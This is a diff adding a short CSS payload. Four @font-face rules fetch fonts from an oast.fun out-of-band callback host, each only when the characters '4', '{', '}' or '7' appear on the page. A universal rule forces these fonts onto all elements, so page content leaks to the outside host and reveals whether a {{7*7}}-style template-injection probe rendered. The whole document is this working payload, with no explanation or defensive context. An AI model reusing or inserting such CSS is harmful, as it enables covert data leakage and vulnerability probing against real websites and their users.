@@ -1,0 +1,5 @@
+@font-face { font-family: 'c49'; src: url('http://ssti-49.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/'); unicode-range: U+0034; }
+@font-face { font-family: 'c7b'; src: url('http://ssti-7b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/'); unicode-range: U+007B; }
+@font-face { font-family: 'c7d'; src: url('http://ssti-7d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/'); unicode-range: U+007D; }
+@font-face { font-family: 'c37'; src: url('http://ssti-37.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/'); unicode-range: U+0037; }
+* { font-family: 'c49', 'c7b', 'c7d', 'c37', sans-serif !important; }
